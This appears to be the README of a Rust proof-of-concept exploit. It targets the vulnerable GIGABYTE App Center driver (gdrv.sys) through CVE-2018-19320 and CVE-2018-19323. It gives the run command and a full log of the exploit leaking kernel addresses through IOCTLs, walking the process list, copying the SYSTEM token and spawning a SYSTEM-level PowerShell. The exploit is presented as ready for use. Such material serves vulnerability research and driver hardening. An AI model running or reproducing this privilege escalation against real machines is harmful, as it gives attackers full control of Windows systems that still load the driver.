# CVE-2018-1932X ( Rust Exploit POC) for GIGABYTE APP Center v1.05.21 and earlier

> Just because your target is memory unsafe doesn't mean your exploit has to be!

Vulnerabilities used :
 * [CVE-2018-19320](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19320) - ring0 memcpy-like functionality
 * [CVE-2018-19323](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19323) - read and write Machine Specific Registers (MSRs).

Tested on: 
 * 20H1: `Windows 10 Kernel Version 19041 MP (1 procs) Free x64`

## References
* [Vergilius Project: Kernel Structs](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/2004%2020H1%20(May%202020%20Update))
* [Gigabyte Patch Announcement](https://www.gigabyte.com/Support/Security/1801)
* [_KPCR Details](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kpcr.htm)


## Requirements
* x64 only
* Tested Build #'s above
* Loaded GIGABYTE Driver: [gdrv.sys](driver/gdrv.sys)

## Usage
`.\CVE-2018-1932X.exe`

## Example
```
PS Z:\CVE-2018-1932X\target\debug> .\CVE-2018-1932X.exe
CVE-2019-1932X

Opening Handle to Kernel Driver: \\.\GIO
Acquired Handle: 0xa8
Sending IOCTL: 0xc3502580 with 0x10 bytes of data
  [+] Leaked   _KPCR: ffffe48159d88000
  [*] Address  _KPCRB: ffffe48159d88020
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Leaked   _KPRCB: ffffe48159d88180
  [*] Address  _KTHREAD: ffffe48159d88188
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Leaked   _KTHREAD: ffffb50b14d16080
  [*] Address  _KPROCESS: ffffb50b14d162a0
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Leaked   _KPROCESS: ffffb50b1507f080
  [*] Address  PID: ffffb50b1507f4c0
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Leaked   PID: 2092
  [+] Known    PID: 2092
Walking Active Process Links...
  [*] Address  ActiveProcessLinks.Flink: ffffb50b1507f4c8 (PID: 82c)
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Leaked   _EPROCESS: fffff8015561e060 (PID: 0)
  [*] Address  ActiveProcessLinks.Flink: fffff8015561e060 (PID: 0)
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Leaked   _EPROCESS: ffffb50b100624c8 (PID: 4)
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Current Token: ffff9708cac8306e
  [+] System  Token: ffff9708c567b047
Borrowing SYSTEM Token...
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
Sending IOCTL: 0xc3502808 with 0x14 bytes of data
  [+] Current Token: ffff9708c567b047
Spawning Process...
  [+] Spawned SYSTEM Process
Closing Handle to Kernel Driver: \\.\GIO
```
Spawned Powershell:
```
PS C:\> whoami
nt authority\system
```
## Vulnerable Blocks

### Memcpy (IOCTL 0x0C3502808)
![Memcpy Code Blocks](docs/memcpy_blocks.png)
### MSR Manipulation (IOCTL 0x0C3502580)
![MSR Code Blocks](docs/msr_blocks.png)
